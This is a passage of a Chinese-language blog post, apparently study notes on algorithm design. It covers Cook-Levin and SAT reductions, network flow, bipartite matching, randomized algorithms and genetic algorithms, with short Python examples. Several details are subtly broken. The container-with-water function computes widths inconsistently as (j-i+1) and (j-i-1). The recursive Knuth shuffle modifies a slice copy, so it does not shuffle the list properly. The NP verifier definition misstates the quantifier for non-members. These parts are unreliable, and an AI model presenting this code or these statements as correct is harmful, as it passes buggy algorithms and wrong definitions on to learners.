\right}$里抽取的文字。我们需要决定是否存在一些变量的设置使得$\phi$得到满足</p><p><strong>2-CNF和3-CNF</strong></p><ul><li>重要性：NP-完全问题是一类任何NP问题可以以多项式时间转化的问题。任一NP完全问题可以多项式时间求解，则所有NP-完全问题都变成了P问题</li><li>2-CNF：子句包含1或2个变量的满足性决策问题</li><li>3-CNF：子句可以包含3个变量</li><li>2-CNF是P问题，而3-CNF属于NPC</li></ul><p><strong>SAT的NP完全性质</strong></p><p>要证明SAT问题是NP完全的，只需证明NP中的任何问题都可以在多项式时间内归约为SAT问题</p><ul><li>首先把问题限制为决策问题：把原始问题转化为一个成员问题，即给定的输入是否属于某种语言。那么，P表示可以在多项式时间内确定成员隶属的语言类，而NP代表存在一个可以在多项式时间内验证其成员隶属的语言类。</li><li>其次，需要将一个问题规约为另一个问题。问题A可以规约到问题B，则如果得到B的一个解，可以多项式时间内调用这个解还原性为A的解。</li></ul><p>Cook-Levin定理表名，对于NP中的任何问题，都存在到SAT的一种规约，从而证明SAT是NP完全的</p><p><strong>Cook-Levin定理</strong></p><blockquote><p>SAT is NP-complete</p></blockquote><p>假设L是一个NP问题，根据定义，则L具有一个多项式时间的验证算法V：</p><ul><li>If $x\in L$，$\exist$见证者y，V(x,y) &#x3D; 1</li><li>If $x \notin L$，$\exist$见证者y，V(x,y) &#x3D; 0</li></ul><p>可以为V构造一个多项式大小的电路，由AND、OR、NOT组成。改电路包含|x|+|y|个输入，其中|x|对应x的每一位的值，|y|代表可变变量</p><p><strong>Cook-Levin定理证明思路</strong></p><p>要求解问题L，只需要找到输入中的|y|个变量中的一种设置使电路的输出为1。这样就把问题L归结为决定电路是否能输出1的问题。接下来证明满足电路的问题可被归为SAT的一个实例。电路中的每一个门可以表示称一个3CNF（三元CNF，每个子句金包含三项）</p><p>例如：</p><ul><li><p>或门OR是一个输入a和b以及输出$Z_i$的函数，表示为$(a \vee b \vee \bar Z_i) \wedge (Z_i \vee \bar a) \wedge (Z_i \vee \bar b) $</p><blockquote><p>a,b&#x3D;true&#x2F;false</p></blockquote></li><li><p>非门NOT是一个输入a且输出$Z_i$的函数，表示为$(a \vee \bar Z_i) \wedge (\bar a \vee Z_i)$</p><blockquote><p>a&#x3D;true&#x2F;false</p></blockquote></li></ul><p>即使有些子句只包含少于3项，可以通过填充独立文字来构造3CNF。独立文字的值不影响从句的布尔量。</p><p><strong>Cook-Levin定理证明</strong></p><p>假设V中共有q个门，记为$Z_i,Z_2,\dots,Z_q$，其中$Z_q$是V的最后输出。</p><p>这些门要么直接使用输入，要么使用中间结果$Z_i$为输入。</p><p>因此，整个电路可以表示为CNF形式的公式：$\phi &#x3D; C_1\wedge C_2\wedge \dots \wedge C_q \wedge Z_q$，其中每个$C_i&#x3D;(t_i \vee t_2 \vee t_3)$，$t_1,t_2,t_3 \in \left{ x,y,Z_1,Z_2,\dots,Z_q,\bar Z_1,\bar Z_2,\dots,\bar Z_q \right}$。</p><p>如前所述，即使最后一个子句只含一项$Z_q$，也可等价转换为3-CNF。因此，该电路被归结为$\phi$，3-CNF形式的公式。</p><p>$\phi$被满足当且仅当原电路输出1。</p><p>所以，$L \le_p SAT$，SAT是NP完全问题</p><h4 id="接雨水（贪婪）"><a href="#接雨水（贪婪）" class="headerlink" title="接雨水（贪婪）"></a>接雨水（贪婪）</h4><p>问题描述：给定一个长度为n的整形数组，元素均大于0，以其中任意两个作为隔板，且位置不变，如何使容纳水的容积最大？</p><p>解题思路：选择短板算容量并淘汰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">water</span>(<span class="hljs-params">a</span>):<br>    n = <span class="hljs-built_in">len</span>(a)<br>    i,j = <span class="hljs-number">0</span>,n-<span class="hljs-number">1</span><br>    m = tmp = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> i &lt; j:<br>        <span class="hljs-keyword">if</span> a[i] &lt; a[j]:<br>            tmp = a[i]*(j-i+<span class="hljs-number">1</span>)<br>            i+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            tmp = a[j]*(j-i-<span class="hljs-number">1</span>)<br>            j-=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> tmp &gt; m:<br>            m = tmp<br>    <span class="hljs-keyword">return</span> m<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    a = [<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">5</span>,<span class="hljs-number">10</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>]<br>    <span class="hljs-built_in">print</span>(water(a))<br></code></pre></td></tr></table></figure><h3 id="6、P和NP-x2F-接雨水-x2F-网络流算法-x2F-排队"><a href="#6、P和NP-x2F-接雨水-x2F-网络流算法-x2F-排队" class="headerlink" title="6、P和NP&#x2F;接雨水&#x2F;网络流算法&#x2F;排队"></a>6、P和NP&#x2F;接雨水&#x2F;网络流算法&#x2F;排队</h3><h4 id="NP问题"><a href="#NP问题" class="headerlink" title="NP问题"></a>NP问题</h4><p><strong>求解与验证</strong></p><ul><li>求解问题看起来比验证答案要难（更加耗时）</li><li>例如：数独，给定初始位置，一般情况下求解数独比验证填好的数字是否满足数独的规则要更加困难</li><li>但是，如果需要验证的解的数量非常大，即使单个答案可以很快验证，总体上也要花费很长时间</li><li>NP是nondetermintstic polynomial time的缩写，指在非确定性图灵机上可以以多项式时间精确求解的问题</li><li>有些问题似乎相似，实际分属P和NP：欧拉旅行问题（访问所有边），汉密尔顿环（一次性访问所有节点）</li></ul><p><strong>CNF</strong></p><p><strong>2-CNF和3-CNF</strong></p><p><strong>Cook-Levin定理</strong></p><h4 id="网络流算法"><a href="#网络流算法" class="headerlink" title="网络流算法"></a>网络流算法</h4><ul><li>假设有一个管道网络，每个管道都有一定的横截面，网络有一个入口和一个出口</li><li>目标是将水通过管道从入口以尽可能大的速率输送到出口</li><li>两个主要限制：通过管道的速度不能超过管道的横截面（容量约束）；在管网的任何连接处，流入的水量必须正好等于流出的水量（流量守恒约束）</li><li>最大流问题要求在给定的有容量图中找到一个最大可能的可行流</li></ul><p><strong>假设</strong></p><ul><li>图G不包含自循环（不含形为(u,u)的边）</li><li>图G不包含多重边，如果$e_1$，$e_2$是从u到v的两条边，容量分别是$c_1$，$c_2$，则可以用一条边容量为$c_1+c_2$的边e表示</li><li>图G有方向性。如果图包含一条无向边(u,v)，可以用两条有向边u-&gt;v和v-&gt;u来代替，每条边的容量都等于c(u,v)</li></ul><p><strong>贪婪算法</strong></p><p>重复下列操作直至所有s~t路径都达到饱和</p><ul><li>寻找带有剩余容量的s~t路径</li><li>让该路径达到饱和</li><li>重复直到没有这种路径存在</li></ul><p>贪婪算法无法保证最优解：单一步骤具有不可撤销的特点</p><p><strong>Ford-Fulkerson算法</strong></p><ul><li>算法的总体思想类似贪婪算法：在每一步通过图选择一条s~t路径，并对其进行饱和</li><li>在剩余图中找到路径，该图明确允许沿先前使用的边反向流动</li><li>给定一个可行流$f$，剩余图$G_f&#x3D;(V_f,E_f)$，容量函数$c_f$按下列方式定义：<ul><li>$V_f&#x3D;V$</li><li>$E_f&#x3D;\left{(u,v)|u,v \in V \wedge (c(u,v) &gt; f(u,v))\right} \cup \left{ (u,v) | u,v \in V \wedge (f(v,u) &gt; 0) \right}$ </li><li>$c_f(u,v)&#x3D;c(u,v)-f(u,v)+f(v,u)$</li></ul></li></ul><p><strong>网络流与割集</strong></p><ul><li>s-t割集是一组边C，使得图$G’&#x3D;(V,E \backslash C)$不包含s~t路径。割集的容量为$cap(C)&#x3D;\sum _{e\in C}c(e)$</li><li>记F为所有可行的流的集合，则对于任意s~t割集C，$cap(C) \ge \max _{f\in F}|f|$</li><li>设$C^*$为G的最小s~t割集，$f^*$是G的最大s-t流，则$cap(C^*) \ge |f^*|$</li></ul><p><strong>主要结论</strong></p><ul><li>如果容量是整数值，Ford-Fulkerson算法可以发现最大流</li><li>最大流量的大小等于最小割集的容量</li><li>算法的运行时间：迭代中的每一步最多需要$O(m)$时间，其中m是边的数目，因为在每次迭代中，流的大小至少增加1，迭代次数的一个简单上界是F，最大流的大小。这是一个$O(mF)$的界。运行时间是一个伪多项式时间。</li></ul><h4 id="排队问题"><a href="#排队问题" class="headerlink" title="排队问题"></a>排队问题</h4><p>问题描述：假设有打乱顺序的一群人站成一个队列，数组people表示队列中一些人的属性（不一定按顺序）。每个$people[i] &#x3D; [h_i,k_i]$表示第$i$个人的身高为$h_i$，前面正好有$k_i$个身高大于或等于$h_i$的人。请重新构造并返回数组people所表示的队列。返回的队列应该格式化为数组queue，其中$queue[j] &#x3D; [h_j,k_j]$是队列中第$j$个人的属性（queue[0]是排在队列前面的人）</p><blockquote><p>示例：输入：people&#x3D;[[7,0],[4,4],[7,1],[5,0],[6,1],[5,2]]</p><p>输出：[[5,0],[7,0],[5,2],[6,1],[4,4],[7,1]]</p></blockquote><h4 id="预告"><a href="#预告" class="headerlink" title="预告"></a>预告</h4><p>随机算法</p><p>在线算法</p><p>经典分治算法应用FFT</p><h3 id="7、排队-x2F-np-x2F-顶点覆盖问题-x2F-二部图匹配（线性规划）"><a href="#7、排队-x2F-np-x2F-顶点覆盖问题-x2F-二部图匹配（线性规划）" class="headerlink" title="7、排队&#x2F;np&#x2F;顶点覆盖问题&#x2F;二部图匹配（线性规划）"></a>7、排队&#x2F;np&#x2F;顶点覆盖问题&#x2F;二部图匹配（线性规划）</h3><h4 id="顶点覆盖问题"><a href="#顶点覆盖问题" class="headerlink" title="顶点覆盖问题"></a>顶点覆盖问题</h4><p><strong>顶点覆盖问题的NP完全性</strong></p><ul><li>Vertex Covering Problem属于NP问题</li><li>任何一个NP完全问题可以规约为顶点覆盖问题</li></ul><p><strong>顶点覆盖问题属于NP</strong></p><ul><li>设计一个多项式时间的验证算法，检验：<ul><li>给定的顶点集合是原图顶点的一个子集</li><li>该顶点集合覆盖了所有的边</li></ul></li><li>上述步骤都可以在多项式时间完成。如果每一步回答都是YES，则返回YES，否则返回NO</li></ul><p><strong>SAT规约为顶点覆盖问题</strong></p><ul><li><p>给定一个3-CNF：</p><p>$\phi &#x3D; (x_1 \vee x_1 \vee x_2) \wedge (\bar x_1 \vee \bar x_2 \vee \bar x_2) \wedge (\bar x_1 \vee x_2 \vee x_2)$</p></li><li><p>设计一个顶点覆盖问题与之等价</p></li></ul><p><img src="/blog/2022/09/01/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1/2022-04-30_112712.png" alt="2022-04-30_112712"></p><h4 id="二部图匹配"><a href="#二部图匹配" class="headerlink" title="二部图匹配"></a>二部图匹配</h4><p><strong>问题描述</strong></p><ul><li>二部图G&#x3D;(V,E)是顶点集V可分为两个不相交的子集X和Y的图，使得每个边$e \in E$有一个端点在X中，另一个端点在Y中</li><li>一个匹配$M \subseteq E$是边的子集，使得V中的每个节点最多出现在M中的一条边上</li><li>Maximal Matching(极大匹配)是指在不将一个节点的度增加到2的情况下，不能再添加任何边的匹配，是一个局部最大值</li><li>Maximum Matching(最大匹配)是具有尽可能多的匹配，它是全局最优的</li></ul><p><strong>二部图与最大流</strong></p><ul><li>目标：在图中找到最大匹配</li><li>可以容易地找到最大匹配：只需在匹配中添加边，直到无法添加更多的边为止</li><li>可以证明，对于任何极大匹配(maximal matching) $M$，$|M| \ge \frac 1 2|M^*|$，其中$M^*$是最大匹配(maximum matching)</li><li>最大匹配问题可以归结为最大流问题</li></ul><p><strong>二部图匹配与最大流</strong></p><ul><li>在$G&#x3D;(V,E)$基础上构造$G’ &#x3D; (V’,E’)$，其中$V’$除$V$中的节点外还包含源s和汇t，$E’$除E中的边外还包含s到X和Y到t的边</li><li>所有边具有单位容量</li><li>对于大小为k的流，X中的点最多带有一条带流量的出边，Y中3的点最多有一条带流量的入边，X到Y有流量的边的个数是k</li><li>解决最大流问题就解决了最大匹配，时间复杂度$O((m+n)n)$</li></ul><p><img src="/blog/2022/09/01/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1/2022-04-30_115228.png" alt="2022-04-30_115228"></p><p><strong>完全匹配</strong></p><ul><li><p>完全匹配是指每个节点上正好有一条边的匹配</p></li><li><p>确定给定二部图是否具有完全匹配的一种方法可以先找到最大匹配，再检查匹配的大小是否等于每个部分中的节点数</p></li><li><p>另一种方法利用了霍尔定理</p><blockquote><p>二部图G(V,E)具有完全匹配当且仅当对每个子集$S \sube X$或$S \sube Y$，S的邻域的大小至少和S一样大，即$|\gamma (S)| \ge |S|$</p></blockquote></li></ul><p><strong>调度问题</strong></p><ul><li>假设$J&#x3D;\left{J_1,J_2,\dots,J_n\right}$是一组作业，$T&#x3D;\left{ T_1,T_2,\dots,T_k \right}$为可执行这些作业的机器上的可用时隙</li><li>每个作业$J$都有一组有效的时隙$S_j \in T$，可以对其进行调度；限制条件是不能同时调度两个作业</li><li>问题是如何找到可以调度的最大作业集</li><li>这一问题可以归结为二部匹配：对于每个作业，在$X$中创建一个节点，对于每个时隙，在$Y$中创建一个节点；对于$S_j$中的每个时隙，在$X$和$Y$之间创建一条边。二部图的最大匹配就是可以调度的最大作业集</li></ul><p><strong>调度问题举例</strong></p><ul><li>某家医院有n名医生，每个医生都有一组休假日。有k个假期段供选择，每个假期段连续跨越几天。设$D_j$为第$j$个假期中包含的天数</li><li>在限制条件下，需要最大限度地将医生分配到天，每天一名医生</li><li>限制：每个医生都有一个容量$c_i$，是可以安排的最大总天数，每个假期段，任何一个医生最多安排一次</li></ul><p><strong>转化为最大流问题</strong></p><ul><li>为每个医生$i$创建一个节点$u_i$，为每个休假日$j$创建一个节点$v_j$；从起始节点s添加一条边到$u_i$，从$v_j$加入一条边到汇点$t$</li><li>医生的容量表示为从$s$到$u_i$的边的容量</li><li>从节点$v_j$到$t$的边的容量都设置为1，表示每个假期选择一个医生</li><li>为了防止医生在休假期间被安排多次，引入中间节点：对于任何医生$i$和假期$j$，创建一个中间节点$w_{ij}$并创建一个从$u_i$到$w_{ij}$的单位容量的边。对于休假期间医生有空的每一天，创建一条从$w_{ij}$到该天节点的单位容量边</li></ul><p><strong>加入中间节点</strong></p><p><img src="/blog/2022/09/01/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1/2022-05-04_102711.png" alt="2022-05-04_102711"></p><p><strong>线性规划</strong></p><ul><li>把最大流可以归结为线性规划问题</li><li>首先考虑最大流问题的一个例子，$G&#x3D;(V,E)$，边$e \in E$的容量为$c_e$</li><li>设变量$f_e$为边$e$上的流量，下面的线性规划可用于最大流问题</li></ul><p>$ max \sum_{v:(s,v) \in E} $ </p><p>subject to $\sum_{u:(u,v) \in E}f(u,v) &#x3D; \sum_{u:(v,u) \in E}f(v,u) $ $\forall v \in V,v \ne s,$ </p><p>$0 \le f_e &lt; c_e $ ，$\forall e \in E$</p><p><strong>线性规划形式</strong></p><p>$min \sum_i c_ix_i$</p><p>subject to $\sum_i A_{ij}x_i \ge b_j$  $\forall j$</p><p>$ x_i \ge 0$  $\forall i$ </p><p><strong>线性规划举例</strong></p><p><img src="/blog/2022/09/01/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1/90cf3102072a47d92eec4727d52285b.jpg" alt="90cf3102072a47d92eec4727d52285b"></p><h3 id="8、线性代数解法-x2F-随机化算法-x2F-knuth-shuffle-x2F-扩展计数范围-x2F-负载均衡问题-x2F-球和桶-x2F-遗传算法"><a href="#8、线性代数解法-x2F-随机化算法-x2F-knuth-shuffle-x2F-扩展计数范围-x2F-负载均衡问题-x2F-球和桶-x2F-遗传算法" class="headerlink" title="8、线性代数解法&#x2F;随机化算法&#x2F;knuth shuffle&#x2F;扩展计数范围&#x2F;负载均衡问题&#x2F;球和桶&#x2F;遗传算法"></a>8、线性代数解法&#x2F;随机化算法&#x2F;knuth shuffle&#x2F;扩展计数范围&#x2F;负载均衡问题&#x2F;球和桶&#x2F;遗传算法</h3><h4 id="线性代数解法练习"><a href="#线性代数解法练习" class="headerlink" title="线性代数解法练习"></a>线性代数解法练习</h4><p><img src="https://raw.githubusercontent.com/Yoonalis/img/master/2022-05-04_135935.png" alt="2022-05-04_135935"></p><p><img src="/blog/2022/09/01/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1/09ec96aa4d19bf976ce665f5b08067d.jpg" alt="09ec96aa4d19bf976ce665f5b08067d"></p><h4 id="随机化算法（拉斯维加斯和蒙特卡洛）"><a href="#随机化算法（拉斯维加斯和蒙特卡洛）" class="headerlink" title="随机化算法（拉斯维加斯和蒙特卡洛）"></a>随机化算法（拉斯维加斯和蒙特卡洛）</h4><ul><li><p>随机化算法是一种类似于可以投掷硬币并根据投掷结果采取不同行动的算法，将讨论两种随机算法：</p></li><li><p>Las Vegas：随机化算法总是能给出正确答案，但在某些情况下可能花费更长的时间。它们的“预期”运行时间是输入大小的多项式，意味着所有可能投币的平均运行时间是多项式。</p><ul><li><p>在最坏的情况下，拉斯维加斯算法可能需要指数级的时间。</p></li><li><p>拉斯维加斯算法的一个例子是快速排序：它根据投币量做出一些决策，总是产生正确的结果，其预期运行时间和最坏情况下的运行时间分别是$nlogn$和$n^2$</p></li></ul></li><li><p>Monte Carlo算法：这些是指有时会得出一个错误的答案的随机算法。</p><ul><li>像拉斯维加斯算法一样，它们的预期运行时间是多项式的，但在最坏情况下可能是指数的。</li><li>通常可以通过多次运行Monte Carlo算法，将得到正确答案的概率“提升”到我们喜欢的最小值。</li><li>例如，如果一个特定的蒙特卡洛算法产生一个概率为$\frac 1 4$的错误结果，并且我们有能力洁厕到一个错误的结果，那么在t次独立运行之后，没有得到正确答案的概率是$(\frac 1 4)^t$。</li><li>在某些优化问题中，我们没有能力检测错误的答案，但可以比较不同的答案，并选择最好的一个。</li></ul></li></ul><blockquote><p>拉斯维加斯算法：采样越多，越有机会找到最优解（试钥匙）</p><p>蒙特卡罗算法：采样越多，越近似最优解（挑最大的苹果）</p></blockquote><p><strong>随机化的优势</strong></p><p>随机算法相比确定型算法具有几个有点：</p><ul><li>简单性。对于相同的任务，随机算法往往比确定型算法简单。例如，快速排序枢纽元的选择。</li><li>效率。对于某些问题，随机算法比确定型算法具有更好的渐近运行时间：对某些问题，确定型算法是以指数时间运行的，而随机算法是已知多项式时间的。</li><li>当算法面临信息不足时，随机化是非常有用的。</li></ul><h4 id="Karger随机化算法"><a href="#Karger随机化算法" class="headerlink" title="Karger随机化算法"></a>Karger随机化算法</h4><h4 id="knuth-shuffle"><a href="#knuth-shuffle" class="headerlink" title="knuth shuffle"></a>knuth shuffle</h4><p>代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">shuffle</span>(<span class="hljs-params">a,n</span>):<br>    tmp = a[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-number">1</span> &gt;= n: <span class="hljs-keyword">return</span> a<br>    i = random.randint(<span class="hljs-number">1</span>,n-<span class="hljs-number">1</span>)<br>    a[<span class="hljs-number">0</span>] = a[i]<br>    a[i] = tmp<br>    shuffle(a[<span class="hljs-number">1</span>:],n-<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> a<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    a = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>]<br>    n = <span class="hljs-built_in">len</span>(a)<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        <span class="hljs-built_in">print</span>(shuffle(a,n))<br></code></pre></td></tr></table></figure><blockquote><p>可能因为依赖的<code>random.randint()</code>这个函数，感觉在短时间内的随机性不是很好</p></blockquote><h4 id="扩展计数范围"><a href="#扩展计数范围" class="headerlink" title="扩展计数范围"></a>扩展计数范围</h4><p>问题描述：给一个能在1-7中取随机的<code>rand7()</code>，设计一个能在1-10中取随机的<code>rand10()</code>，要求取到每个数的概率相等。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rand7</span>():<br>    <span class="hljs-keyword">return</span> random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">7</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rand10</span>():<br>    x=-<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> x == -<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> x &gt; <span class="hljs-number">40</span>:<br>        x = (rand7() - <span class="hljs-number">1</span>) * <span class="hljs-number">7</span> + rand7()<br>    x = x%<span class="hljs-number">10</span>+<span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> x<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-built_in">print</span>(rand10())<br></code></pre></td></tr></table></figure><h4 id="负载均衡问题"><a href="#负载均衡问题" class="headerlink" title="负载均衡问题"></a>负载均衡问题</h4><ul><li>在多个资源之间分配任务</li><li>例如，Nginx一种支持反向代理的开源Web服务器，可以用于高性能的负载均衡</li><li>在网络服务器之间合理分配请求，使每个服务器的工作量基本相同</li><li>简单的方法就是把任务以均匀分布方式分发给服务器</li></ul><p><strong>Nginx负载均衡方法</strong></p><ul><li>Round-Robin：对应用服务器的请求按照轮转方式分配</li><li>最少连接数：将下一条请求分配给活跃连接数最少的服务器</li><li>IP-hash：基于客户端的IP地址，使用哈希函数来决定为下一条请求分配哪一个服务器</li></ul><h4 id="球和桶"><a href="#球和桶" class="headerlink" title="球和桶"></a>球和桶</h4><ul><li>考虑把m个球扔进n个桶的过程</li><li>每一个球都以$\frac 1 n$的概率进入不同的桶，独立于其他的球</li><li>碰撞：两个球扔进同一个桶</li></ul><p><strong>基本结论</strong></p><ul><li><p>两球碰撞的概率是多少？</p></li><li><p>使用贝叶斯定理，再计算边际概率</p></li><li><p>把球i进入桶j的事件记作$B_i^j$</p><p>$Pr[Col_{12}] &#x3D; \sum^2_{i&#x3D;1}Pr[B^i_2|B^i_1]Pr[B^i_1] &#x3D; \sum^n_{i&#x3D;1} \frac 1 n Pr[B^i_1] &#x3D; \frac 1 n$</p></li><li><p>m个球进入n个桶相撞次数的期望值是：$\sum_{i \ne j}Pr[Col_{ij}]&#x3D;\frac 1 n C^2_m$</p></li><li><p>一个桶为空的概率是多少？一个球不落入桶i的概率是$1-\frac 1 n$，因此桶始终为空的概率是$(1-\frac 1 n)^n \to \frac 1 e$</p></li><li><p>空桶个数的期望值是多少？$\frac n e$</p></li><li><p>一个桶内恰好有k个球的概率是多少？$C_n^k(\frac 1 n)^k(1-\frac 1 n)^{n-k} \le \frac {n^k} {k!} \frac 1 {n^k} &#x3D; \frac 1 {k!}$</p></li><li><p>一个桶内至少有k个球的概率是多少？$\le C^k_n(\frac 1 n)^k \le (\frac e k)^k$</p></li></ul><p><img src="/blog/2022/09/01/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1/2022-05-06_152213.png" alt="2022-05-06_152213"></p><h4 id="遗传算法"><a href="#遗传算法" class="headerlink" title="遗传算法"></a>遗传算法</h4><p><strong>介绍</strong></p><ul><li>遗传算法是一种优化算法，用来寻找最大化或最小化的一个特定的函数的最优解</li><li>遗传算法是一个演化计算研究领域的一个分支，模拟繁殖和自然选择的生物过程来求解问题</li><li>与进化论一样，遗传算法的许多过程都是随机的，但允许人们设置随机水平和控制水平，比随机搜索和穷举搜索算法更强大和有效</li><li>优势在于不需要关于给定问题的额外信息，找到其他优化方法由于缺乏连续性、导数、线性或其他特性而无法处理的问题的解</li></ul><p><strong>算法的构成</strong></p><p>模拟生物过程设计，相关术语多从生物学中借用，但比其生物对应物要简单。具体包含如下组成部分：</p><ul><li>一个用于优化的适应度函数</li><li>一个染色体群体</li><li>选择哪些染色体将繁殖的方式</li><li>产生下一代染色体的交叉方式</li><li>新一代染色体中的随机变异</li></ul><p><strong>适应度函数</strong></p><ul><li>适应度函数是指算法力图优化的指标函数</li><li>适应度一词源自进化论，用适应度函数测试并量化每个潜在解决方案的适合程度</li><li>设计适应度函数是算法中最关键的部分之一</li><li>从随机选择的染色体初始群体开始，遗传算法用适应度函数对群体中的每一条染色体进行评估，检验它们解决问题的好坏</li></ul><h3 id="9、演化算法-x2F-模拟退火算法"><a href="#9、演化算法-x2F-模拟退火算法" class="headerlink" title="9、演化算法&#x2F;模拟退火算法"></a>9、演化算法&#x2F;模拟退火算法</h3><h4 id="遗传算法-1"><a href="#遗传算法-1" class="headerlink" title="遗传算法"></a>遗传算法</h4><p><strong>适应度函数</strong></p><ul><li>适应度函数是指算法力图优化的指标函数</li><li>适应度一词源自进化论，用适应度函数测试并量化每个潜在解决方案的适合程度</li><li>设计适应度函数是算法中最关键的部分之一</li><li>从随机选择的染色体初始群体开始，遗传算法用适应度函数对群体中的每一条染色体将进行评估，检验它们解决问题的好坏</li></ul><p><strong>染色体</strong></p><ul><li>染色体是指代表遗传算法候选解决方案一个或多个数值</li><li>每个候选解都被编码为一组参数值，如果问题具有维度n，则通常每个染色体编码为n元数组：$chromosome&#x3D;[p_1,p_2,…,p_n]$，其中每个$p_i$是第i个参数的取值</li><li>将候选解的样本空间转化为染色体是遗传算法的关键，例如二进制可将每个参数值转换为一个0&#x2F;1字符串以创建染色体</li></ul><p><strong>选择算子</strong></p><ul><li>选择算子根据用户定义的概率分布选择一些染色体进行复制</li><li>染色体fitness越高，被选中的可能性就越大。例如，如果f是一个非负适应度函数，那么选择$C_{25}$染色体进行繁殖的概率可以设成$Pr(C_{25} &#x3D; \frac {f(C_{25})} {\sum_i^n f(C_i)} )$</li><li>选择算子以带替换的方式选择染色体，因此同一染色体可以多次选择</li></ul><p><strong>Roullete</strong></p><p><img src="/blog/2022/09/01/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1/2022-05-06_200508.png" alt="2022-05-06_200508"></p><p><strong>交叉算子与变异算子</strong></p><ul><li>交叉算子类似于细胞减数分裂中染色体的生物交叉和重组</li><li>该操作符交换两条所选染色体的子序列来产生两个后代。例如，如果父代染色体为[11010111001000],[01011101010010]，在第四位之后交换，则子代染色体为[01010111001000],[11011101010010]</li><li>变异算子随机翻转新染色体中的单个位(将0变为1，反之亦然)，通常把变异发生的概率设为很低，如0.001</li></ul><p><strong>遗传算法的步骤</strong></p><ul><li>随机产生初始种群</li><li>选择其中一组进行交配，繁殖下一代，使用交叉算子</li><li>使用变异算子</li><li>得到子代后，重新评估适应度函数，接收则停止，否则返回第二步</li></ul><p><strong>单变量函数的优化</strong></p><p><strong>代际更替</strong></p><p><strong>连续值遗传算法</strong></p><p><strong>遗传算法的问题</strong></p><ul><li>如果算法需要搜索连续值，则需要把染色体转换为实数值数组</li><li>算法的解受到浮点数精度的制约</li><li>连续值遗传算法可以比二进制遗传算法更快，因为在计算适应度值时无需预先解码</li><li>例如，适应度函数为$f(x) &#x3D; 2xsin(x)+ysin(2y)$，$chromosone&#x3D;[x,y]$，$0 \le x \le 10,0 \le y \le 10$</li><li>可以提升变异概率，保留部分上一代的个体进入下一代。需要设计新的选择概率形式和交叉算子</li></ul><p><strong>遗传算法应用</strong></p><ul><li><p>背包问题：选择物品，在满足重量约束下使价值最高</p></li><li><p>染色体编码：二进制编码，位数与物品数量一致，1代表放入，0表示不放</p></li><li><p>适应度函数：不超出重量限制时取价值之和，否则设为-1</p></li><li><p>选择概率：$Pr(x_i) &#x3D; \frac {e^{f(x_i)}} {\sum ^n_j e^{f(x_j)}}$</p></li></ul><p><strong>遗传算法问题</strong></p><ul><li>每一代种群相当于一组可行解</li><li>按照概率分布探索解空间的不同区域</li><li>优点：较少的迭代次数，较低的计算强度，可以设计不同的适应度函数求解复杂的优化问题</li><li>困难：收敛过快，易于陷入局部最优；交叉和变异可能导致进入不可行的区域</li></ul><h5 id="遗传算法实现"><a href="#遗传算法实现" class="headerlink" 